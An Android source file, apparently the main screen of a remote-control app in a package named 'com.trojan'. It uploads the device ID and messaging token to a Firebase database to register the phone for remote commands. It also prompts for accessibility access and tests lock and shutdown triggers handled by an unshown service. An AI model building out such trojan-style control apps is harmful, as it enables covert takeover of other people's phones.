package com.trojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessaging;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private TextView tvDeviceInfo;
    // Step 1: Declare variables for all your buttons
    private Button btnOpenAccessibility;
    private Button btnTestLock;
    private Button btnTestShutdown;

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // --- Find all UI elements ---
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        // Step 2: Find each button from the layout by its ID
        btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);
        btnTestLock = findViewById(R.id.btnTestLock);
        btnTestShutdown = findViewById(R.id.btnTestShutdown);

        // --- Get Device ID and FCM Token (your existing automated logic) ---
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfoText = "Device ID:\n" + deviceId + "\n\nFetching FCM Token...";
        tvDeviceInfo.setText(deviceInfoText);
        uploadTokenToDatabase(deviceId);

        // --- Step 3: Set up button click listeners ---

        // Listener for the "Open Accessibility Settings" button
        btnOpenAccessibility.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // This code runs when the button is clicked
                Toast.makeText(MainActivity.this, "Opening Accessibility Settings...", Toast.LENGTH_SHORT).show();
                // Create an intent to open the system's accessibility screen
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            }
        });

        // Listener for the "Test Lock" button
        btnTestLock.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // This code runs when the button is clicked
                Log.d(TAG, "Sending local LOCK broadcast");
                Toast.makeText(MainActivity.this, "Testing Lock Command...", Toast.LENGTH_SHORT).show();
                // Send a broadcast that the Accessibility Service is listening for
                sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN));
            }
        });

        // Listener for the "Test Shutdown" button
        btnTestShutdown.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // This code runs when the button is clicked
                Log.d(TAG, "Sending local SHUTDOWN broadcast");
                Toast.makeText(MainActivity.this, "Testing Shutdown Command...", Toast.LENGTH_SHORT).show();
                // Send a broadcast that the Accessibility Service is listening for
                sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN));
            }
        });
    }

    /**
     * Fetches the current FCM registration token and uploads it to the Realtime Database.
     * @param deviceId The unique ID for this device.
     */
    private void uploadTokenToDatabase(String deviceId) {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                if (!task.isSuccessful()) {
                    Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                    return;
                }
                String token = task.getResult();
                DatabaseReference database = FirebaseDatabase.getInstance().getReference("devices");
                database.child(deviceId).setValue(token).addOnCompleteListener(dbTask -> {
                    if (dbTask.isSuccessful()) {
                        String successText = "Device ID:\n" + deviceId + "\n\nToken successfully uploaded.";
                        tvDeviceInfo.setText(successText);
                        Log.d(TAG, "Token uploaded successfully.");
                    } else {
                        tvDeviceInfo.setText("Failed to upload token to database.");
                        Log.w(TAG, "Database write failed", dbTask.getException());
                    }
                });
            }
        });
    }
}
